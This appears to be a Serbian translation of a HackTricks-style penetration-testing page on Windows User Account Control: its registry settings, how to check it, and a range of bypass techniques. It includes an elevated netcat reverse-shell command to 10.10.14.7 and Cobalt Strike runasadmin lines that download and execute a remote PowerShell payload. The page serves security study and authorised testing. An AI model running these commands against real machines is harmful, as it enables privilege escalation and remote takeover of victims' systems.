# UAC - Kontrola korisničkog naloga

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) za lako kreiranje i **automatizaciju radnih tokova** pokretanih **najnaprednijim** alatima zajednice.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Kontrola korisničkog naloga (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **izdavanje saglasnosti za uzvišene aktivnosti**. Aplikacije imaju različite `integrity` nivoe, a program sa **visokim nivoom** može izvoditi zadatke koji **mogu potencijalno ugroziti sistem**. Kada je UAC omogućen, aplikacije i zadaci se uvek **izvode pod sigurnosnim kontekstom naloga koji nije administrator** osim ako administrator izričito ne odobri tim aplikacijama/zadacima pristup na nivou administratora za izvršavanje. To je funkcija pogodnosti koja štiti administratore od nenamernih promena, ali se ne smatra sigurnosnom granicom.

Za više informacija o nivoima integriteta:

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Kada je UAC aktivan, korisniku administratoru se dodeljuju 2 tokena: standardni korisnički ključ, za obavljanje redovnih akcija na redovnom nivou, i jedan sa privilegijama administratora.

Ova [stranica](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) detaljno objašnjava kako UAC funkcioniše i uključuje proces prijavljivanja, korisničko iskustvo i arhitekturu UAC-a. Administratori mogu koristiti sigurnosne politike za konfiguraciju načina na koji UAC funkcioniše specifično za njihovu organizaciju na lokalnom nivou (koristeći secpol.msc), ili konfigurisan i distribuiran putem objekata grupne politike (GPO) u okruženju Active Directory domena. Različite postavke su detaljno objašnjene [ovde](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Postoji 10 postavki grupne politike koje se mogu postaviti za UAC. Sledeća tabela pruža dodatne detalje:

| Postavka grupne politike                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Podrazumevana postavka                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Kontrola korisničkog naloga: Mod odobrenja administratora za ugrađeni nalog administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Onemogućeno                                                 |
| [Kontrola korisničkog naloga: Dozvoli UIAccess aplikacijama da traže uzdizanje bez korišćenja sigurnog radnog okruženja](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Onemogućeno                                                 |
| [Kontrola korisničkog naloga: Ponašanje prompte za uzdizanje za administratore u režimu odobrenja administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Traži saglasnost za ne-Windows binarne datoteke            |
| [Kontrola korisničkog naloga: Ponašanje prompte za uzdizanje za standardne korisnike](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Traži kredencijale na sigurnom radnom okruženju            |
| [Kontrola korisničkog naloga: Otkrivanje instalacija aplikacija i traženje uzdizanja](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Omogućeno (podrazumevano za kućne verzije) Onemogućeno (podrazumevano za preduzeća) |
| [Kontrola korisničkog naloga: Uzdigni samo izvršne datoteke koje su potpisane i validirane](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Onemogućeno                                                 |
| [Kontrola korisničkog naloga: Uzdigni samo UIAccess aplikacije koje su instalirane na sigurnim lokacijama](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Omogućeno                                                  |
| [Kontrola korisničkog naloga: Pokreni sve administratore u režimu odobrenja administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Omogućeno                                                  |
| [Kontrola korisničkog naloga: Prebaci se na sigurno radno okruženje kada se traži uzdizanje](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Omogućeno                                                  |
| [Kontrola korisničkog naloga: Virtualizuj neuspehe pisanja u datoteke i registru na lokacije po korisniku](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Omogućeno                                                  |

### Teorija zaobilaženja UAC-a

Neki programi su **automatski uzdignuti** ako **korisnik pripada** **grupi administratora**. Ove binarne datoteke imaju unutar svojih _**Manifesta**_ opciju _**autoElevate**_ sa vrednošću _**True**_. Binarna datoteka takođe mora biti **potpisana od strane Microsoft-a**.

Zatim, da bi se **zaobišao** **UAC** (uzdignuti sa **srednjeg** nivoa integriteta **na visoki**), neki napadači koriste ovu vrstu binarnih datoteka da **izvrše proizvoljni kod** jer će biti izvršen iz **procesa sa visokim nivoom integriteta**.

Možete **proveriti** _**Manifest**_ binarne datoteke koristeći alat _**sigcheck.exe**_ iz Sysinternals. I možete **videti** **nivo integriteta** procesa koristeći _Process Explorer_ ili _Process Monitor_ (iz Sysinternals).

### Proverite UAC

Da potvrdite da li je UAC omogućen, uradite:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Ako je **`1`**, onda je UAC **aktiviran**, ako je **`0`** ili **ne postoji**, onda je UAC **neaktivan**.

Zatim, proverite **koji nivo** je konfiguran:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Ako je **`0`**, UAC neće tražiti (kao **onemogućeno**)
- Ako je **`1`**, administrator je **tražen za korisničkim imenom i lozinkom** da izvrši binarni fajl sa visokim pravima (na Secure Desktop)
- Ako je **`2`** (**Uvek me obavesti**) UAC će uvek tražiti potvrdu od administratora kada pokuša da izvrši nešto sa visokim privilegijama (na Secure Desktop)
- Ako je **`3`**, kao `1` ali nije neophodno na Secure Desktop
- Ako je **`4`**, kao `2` ali nije neophodno na Secure Desktop
- Ako je **`5`**(**podrazumevano**), tražiće od administratora da potvrdi pokretanje ne-Windows binarnih fajlova sa visokim privilegijama

Zatim, treba da pogledate vrednost **`LocalAccountTokenFilterPolicy`**\
Ako je vrednost **`0`**, tada samo **RID 500** korisnik (**ugrađeni Administrator**) može da obavlja **administrativne zadatke bez UAC**, a ako je `1`, **svi nalozi unutar grupe "Administratori"** mogu to da rade.

I, konačno, pogledajte vrednost ključa **`FilterAdministratorToken`**\
Ako je **`0`**(podrazumevano), **ugrađeni Administrator nalog može** da obavlja zadatke daljinske administracije, a ako je **`1`**, ugrađeni nalog Administrator **ne može** da obavlja zadatke daljinske administracije, osim ako je `LocalAccountTokenFilterPolicy` postavljen na `1`.

#### Sažetak

- Ako je `EnableLUA=0` ili **ne postoji**, **nema UAC za nikoga**
- Ako je `EnableLua=1` i **`LocalAccountTokenFilterPolicy=1`, Nema UAC za nikoga**
- Ako je `EnableLua=1` i **`LocalAccountTokenFilterPolicy=0` i `FilterAdministratorToken=0`, Nema UAC za RID 500 (Ugrađeni Administrator)**
- Ako je `EnableLua=1` i **`LocalAccountTokenFilterPolicy=0` i `FilterAdministratorToken=1`, UAC za sve**

Sve ove informacije mogu se prikupiti koristeći **metasploit** modul: `post/windows/gather/win_privs`

Takođe možete proveriti grupe vašeg korisnika i dobiti nivo integriteta:
```
net user %username%
whoami /groups | findstr Level
```
## UAC zaobilaženje

> [!NOTE]
> Imajte na umu da ako imate grafički pristup žrtvi, zaobilaženje UAC-a je jednostavno jer možete jednostavno kliknuti na "Da" kada se pojavi UAC prozor.

Zaobilaženje UAC-a je potrebno u sledećoj situaciji: **UAC je aktiviran, vaš proces se izvršava u kontekstu srednje integriteta, a vaš korisnik pripada grupi administratora**.

Važno je napomenuti da je **mnogo teže zaobići UAC ako je na najvišem nivou sigurnosti (Uvek) nego ako je na bilo kojem od drugih nivoa (Podrazumevano).**

### UAC onemogućen

Ako je UAC već onemogućen (`ConsentPromptBehaviorAdmin` je **`0`**) možete **izvršiti obrnuti shell sa administratorskim privilegijama** (visok nivo integriteta) koristeći nešto poput:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC zaobilaženje sa duplikacijom tokena

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Veoma** osnovno UAC "zaobilaženje" (potpun pristup sistemu datoteka)

Ako imate shell sa korisnikom koji je unutar Administrators grupe, možete **montirati C$** deljenje putem SMB (sistem datoteka) lokalno na novom disku i imaćete **pristup svemu unutar sistema datoteka** (čak i Administratorovoj početnoj fascikli).

> [!WARNING]
> **Izgleda da ova trik više ne funkcioniše**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC zaobilaženje sa cobalt strike

Tehnike Cobalt Strike će raditi samo ako UAC nije postavljen na maksimalni nivo bezbednosti.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** takođe imaju nekoliko modula za **obići** **UAC**.

### KRBUACBypass

Dokumentacija i alat u [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass eksploati

[**UACME** ](https://github.com/hfiref0x/UACME)koji je **kompilacija** nekoliko UAC bypass eksploata. Imajte na umu da ćete morati da **kompajlirate UACME koristeći visual studio ili msbuild**. Kompilacija će kreirati nekoliko izvršnih fajlova (kao što je `Source\Akagi\outout\x64\Debug\Akagi.exe`), moraćete da znate **koji vam je potreban.**\
Trebalo bi da **budete oprezni** jer neki bypass-ovi mogu **izazvati neka druga programa** koja će **obavestiti** **korisnika** da se nešto dešava.

UACME ima **verziju iz koje je svaka tehnika počela da funkcioniše**. Možete pretraživati tehniku koja utiče na vaše verzije:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Takođe, koristeći [this](https://en.wikipedia.org/wiki/Windows_10_version_history) stranicu dobijate Windows verziju `1607` iz verzija build-a.

#### Više UAC zaobilaženja

**Sve** tehnike korišćene ovde za zaobilaženje AUC **zahtevaju** **potpunu interaktivnu ljusku** sa žrtvom (obična nc.exe ljuska nije dovoljna).

Možete dobiti koristeći **meterpreter** sesiju. Migrirajte na **proces** koji ima **Session** vrednost jednaku **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ bi trebao raditi)

### UAC zaobilaženje sa GUI

Ako imate pristup **GUI, možete jednostavno prihvatiti UAC prompt** kada ga dobijete, zaista vam ne treba zaobilaženje. Dakle, dobijanje pristupa GUI će vam omogućiti da zaobiđete UAC.

Štaviše, ako dobijete GUI sesiju koju je neko koristio (potencijalno putem RDP) postoje **neki alati koji će raditi kao administrator** odakle možete **pokrenuti** **cmd** na primer **kao admin** direktno bez ponovnog traženja od strane UAC kao [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo bi moglo biti malo **diskretnije**.

### Glasno brute-force UAC zaobilaženje

Ako vas ne brine da budete glasni, uvek možete **pokrenuti nešto poput** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) što **traži da se podignu dozvole dok korisnik ne prihvati**.

### Vaše vlastito zaobilaženje - Osnovna metodologija UAC zaobilaženja

Ako pogledate **UACME**, primetićete da **većina UAC zaobilaženja zloupotrebljava Dll Hijacking ranjivost** (pretežno pisanje malicioznog dll-a na _C:\Windows\System32_). [Pročitajte ovo da biste saznali kako pronaći Dll Hijacking ranjivost](../windows-local-privilege-escalation/dll-hijacking/).

1. Pronađite binarni fajl koji će **autoelevate** (proverite da kada se izvrši, radi na visokom integritetu).
2. Sa procmon pronađite događaje "**NAME NOT FOUND**" koji mogu biti ranjivi na **DLL Hijacking**.
3. Verovatno ćete morati da **napišete** DLL unutar nekih **zaštićenih putanja** (kao što je C:\Windows\System32) gde nemate dozvole za pisanje. Možete zaobići ovo koristeći:
   1. **wusa.exe**: Windows 7,8 i 8.1. Omogućava ekstrakciju sadržaja CAB fajla unutar zaštićenih putanja (jer se ovaj alat izvršava iz visoke integriteta).
   2. **IFileOperation**: Windows 10.
4. Pripremite **skriptu** da kopirate svoj DLL unutar zaštićene putanje i izvršite ranjivi i autoelevated binarni fajl.

### Još jedna tehnika zaobilaženja UAC

Sastoji se u posmatranju da li **autoElevated binarni** pokušava da **pročita** iz **registrija** **ime/putanju** **binarne** ili **komande** koja treba da bude **izvršena** (ovo je zanimljivije ako binarni traži ove informacije unutar **HKCU**).

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane od strane **najnaprednijih** alata zajednice na svetu.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{{#include ../../banners/hacktricks-training.md}}
